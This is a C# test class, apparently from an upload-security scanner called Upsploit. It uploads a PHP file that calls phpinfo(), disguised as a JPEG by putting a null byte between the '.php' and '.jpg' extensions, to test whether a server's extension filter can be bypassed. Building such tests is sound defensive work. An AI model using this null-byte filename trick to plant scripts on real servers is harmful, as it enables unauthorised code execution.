using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

/*
* Test #9
* Description: This test insert a null byte before the allowed extension but after the forbidden one. 
* The server should cut off everything after the null byte.
*/
namespace Upsploit.Tests {
    class Test09 : Test {
        internal override async Task runTest(UploadRequest.UploadRequest request) {
            //Insert a null byte between the two extensions
            const string data = "<?php\n"
                                + "  echo phpinfo();\n"
                                + "?>";

            IEnumerable<byte> rv = Encoding.ASCII.GetBytes("Test_9.php").Concat(new byte[] {0x00}).Concat(Encoding.ASCII.GetBytes(".jpg"));
 

            request.setFileData(data);
            request.setFileContentType("image/jpeg");
            request.setFileName(rv.ToArray());

            await request.send();
            printResult(request, "Test 9 (Null byte)");
        }
    }
}